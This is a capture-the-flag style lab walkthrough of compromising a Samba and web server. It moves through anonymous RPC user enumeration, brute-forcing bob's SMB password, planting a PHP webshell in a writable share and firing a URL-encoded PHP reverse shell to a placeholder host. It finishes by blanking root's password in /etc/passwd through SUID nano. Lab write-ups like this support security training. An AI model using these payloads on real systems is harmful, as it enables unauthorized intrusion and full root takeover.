
# PORT SCAN
---


| PORT | SERVICE |
| :--- | :------ |
| 80   | HTTP    |
| 139  | SMB     |
| 445  | SMB     |



# RECONNAISSANCE
---

We got smb enabled on the machine, let's check if we can perform anonymous enumeration here:

```bash
smbclient -L //172.17.0.2 -N

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	html            Disk      HTML Share
	IPC$            IPC       IPC Service (3b1cc613d67f server (Samba, Ubuntu))
```

```bash
nxc smb 172.17.0.2 -u '' -p '' --shares

SMB         172.17.0.2      445    3B1CC613D67F     [*] Unix - Samba (name:3B1CC613D67F) (domain:3B1CC613D67F) (signing:False) (SMBv1:False) 
SMB         172.17.0.2      445    3B1CC613D67F     [+] 3B1CC613D67F\: 
SMB         172.17.0.2      445    3B1CC613D67F     [*] Enumerated shares
SMB         172.17.0.2      445    3B1CC613D67F     Share           Permissions     Remark
SMB         172.17.0.2      445    3B1CC613D67F     -----           -----------     ------
SMB         172.17.0.2      445    3B1CC613D67F     print$                          Printer Drivers
SMB         172.17.0.2      445    3B1CC613D67F     html                            HTML Share
SMB         172.17.0.2      445    3B1CC613D67F     IPC$                            IPC Service (3b1cc613d67f server (Samba, Ubuntu))
```

We got some shares, but we can't read any, let's proceed to the web application then:

![Pasted image 20250821175214.png](../../IMAGES/Pasted%20image%2020250821175214.png)

Fuzzing doesn't bring anything important:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt:FUZZ -u 'http://172.17.0.2/FUZZ' -ic -c -t 200 -e .php,.html,.js,.git,.json,.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://172.17.0.2/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
 :: Extensions       : .php .html .js .git .json .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.html                   [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 3ms]
.php                    [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 3ms]
index.html              [Status: 200, Size: 1832, Words: 492, Lines: 49, Duration: 992ms]
.php                    [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 0ms]
.html                   [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 2ms]
server-status           [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 13ms]
```

What can we do then, let's think outside the box, we can't access smb with anonymous credentials, what about `rpcclient`?

```bash
rpcclient -U "" -N 172.17.0.2
rpcclient $> enumdomusers
user:[james] rid:[0x3e8]
user:[bob] rid:[0x3e9]
```

We're able to access `rpcclient`, let's get more info:

```
rpcclient $> querydominfo
Domain:		WORKGROUP
Server:		3B1CC613D67F
Comment:	3b1cc613d67f server (Samba, Ubuntu)
Total Users:	2
Total Groups:	0
Total Aliases:	0
Sequence No:	1755800264
Force Logoff:	4294967295
Domain Server State:	0x1
Server Role:	ROLE_DOMAIN_PDC
Unknown 3:	0x1

rpcclient $> queryuser 0x3e8
	User Name   :	james
	Full Name   :	james
	Home Drive  :	\\3B1CC613D67F\james
	Dir Drive   :	
	Profile Path:	\\3B1CC613D67F\james\profile
	Logon Script:	
	Description :	
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Wed, 31 Dec 1969 19:00:00 EST
	Logoff Time              :	Wed, 06 Feb 2036 10:06:39 EST
	Kickoff Time             :	Wed, 06 Feb 2036 10:06:39 EST
	Password last set Time   :	Thu, 11 Apr 2024 04:03:59 EDT
	Password can change Time :	Thu, 11 Apr 2024 04:03:59 EDT
	Password must change Time:	Wed, 13 Sep 30828 22:48:05 EDT
	unknown_2[0..31]...
	user_rid :	0x3e8
	group_rid:	0x201
	acb_info :	0x00000010
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x00000000
	padding1[0..7]...
	logon_hrs[0..21]...
	
	
rpcclient $> queryuser 0x3e9
	User Name   :	bob
	Full Name   :	bob
	Home Drive  :	\\3B1CC613D67F\bob
	Dir Drive   :	
	Profile Path:	\\3B1CC613D67F\bob\profile
	Logon Script:	
	Description :	
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Wed, 31 Dec 1969 19:00:00 EST
	Logoff Time              :	Wed, 06 Feb 2036 10:06:39 EST
	Kickoff Time             :	Wed, 06 Feb 2036 10:06:39 EST
	Password last set Time   :	Thu, 11 Apr 2024 04:04:09 EDT
	Password can change Time :	Thu, 11 Apr 2024 04:04:09 EDT
	Password must change Time:	Wed, 13 Sep 30828 22:48:05 EDT
	unknown_2[0..31]...
	user_rid :	0x3e9
	group_rid:	0x201
	acb_info :	0x00000010
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x00000000
	padding1[0..7]...
	logon_hrs[0..21]...
```

Ok, we got two users, `bob` and `james`, we can perform password spraying on these users on the SMB protocol using nxc, let's proceed to exploitation.

# EXPLOITATION
---

If we try using normal `rockyou`, we get an alert:

```
nxc smb 172.17.0.2 -u bob -p /usr/share/wordlists/rockyou.txt --shares
SMB         172.17.0.2      445    3B1CC613D67F     [*] Unix - Samba (name:3B1CC613D67F) (domain:3B1CC613D67F) (signing:False) (SMBv1:False) 
[14:21:21] ERROR    UnicodeDecodeError: Could not decode password file. Make sure the file only contains UTF-8 characters.                                                                connection.py:416
           ERROR    You can ignore non UTF-8 characters with the option '--ignore-pw-decoding' 
```

Let's use that flag and try to brute force both users:

```
nxc smb 172.17.0.2 -u bob -p /usr/share/wordlists/rockyou.txt --shares --ignore-pw-decoding

SMB         172.17.0.2      445    3B1CC613D67F     [+] 3B1CC613D67F\bob:star 
SMB         172.17.0.2      445    3B1CC613D67F     [*] Enumerated shares
SMB         172.17.0.2      445    3B1CC613D67F     Share           Permissions     Remark
SMB         172.17.0.2      445    3B1CC613D67F     -----           -----------     ------
SMB         172.17.0.2      445    3B1CC613D67F     print$          READ            Printer Drivers
SMB         172.17.0.2      445    3B1CC613D67F     html            READ,WRITE      HTML Share
SMB         172.17.0.2      445    3B1CC613D67F     IPC$                            IPC Service (3b1cc613d67f server (Samba, Ubuntu))
```

We get a match on bob:

![Pasted image 20250821175226.png](../../IMAGES/Pasted%20image%2020250821175226.png)

```
bob / star
```

We have `read,write` permissions on the html share, let's go into it:

```
smbclient //172.17.0.2/html -U 'bob'
Password for [WORKGROUP\bob]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Aug 21 14:23:59 2025
  ..                                  D        0  Thu Apr 11 04:18:47 2024
  index.html                          N     1832  Thu Apr 11 04:21:43 2024
```

Since we know we got write permissions on the share, we can put a simple webshell to check how the page behaves:

```php
<?php system($_GET['cmd']); ?>
```

![Pasted image 20250821175230.png](../../IMAGES/Pasted%20image%2020250821175230.png)

Ok, let's check the web application, our webshell must be there:

![Pasted image 20250821175245.png](../../IMAGES/Pasted%20image%2020250821175245.png)

Nice, we got RCE, time to send ourselves a revshell:

```
http://172.17.0.2/webshell.php?cmd=php+-r+%27%24sock%3dfsockopen(%22CHANGE_IP%22%2C4444)%3bexec(%22%2Fbin%2Fsh+-i+%3C%263+%3E%263+2%3E%263%22)%3b%27
```

If we check our listener:

![Pasted image 20250821175237.png](../../IMAGES/Pasted%20image%2020250821175237.png)

We got a shell, let's proceed with privesc.


# PRIVILEGE ESCALATION
---

Time to use linpeas:

![Pasted image 20250821175252.png](../../IMAGES/Pasted%20image%2020250821175252.png)

We got `/usr/bin/nano` as a binary with root SUID, we can check gtfobins:

![Pasted image 20250821175255.png](../../IMAGES/Pasted%20image%2020250821175255.png)

![Pasted image 20250821175300.png](../../IMAGES/Pasted%20image%2020250821175300.png)

First of all, let's switch to bob, we can use the credentials we found earlier:

![Pasted image 20250821175308.png](../../IMAGES/Pasted%20image%2020250821175308.png)

We can test these options but none of them will get us a shell, then what can we do?

We can edit `/etc/passwd` and erase the `x` on the root user so we can access root without the need of a password, let's do it:

```
/usr/bin/nano /etc/passwd
```

We need to edit this line:

```
root:x:0:0:root:/root:/bin/bash
```

And erase the `x`:

```
root::0:0:root:/root:/bin/bash
```

![Pasted image 20250821175315.png](../../IMAGES/Pasted%20image%2020250821175315.png)

Now we can access root and end the lab:

```
bob@3b1cc613d67f:/tmp$ su root
root@3b1cc613d67f:/tmp# whoami
root
root@3b1cc613d67f:/tmp#
```

![Pasted image 20250821175321.png](../../IMAGES/Pasted%20image%2020250821175321.png)

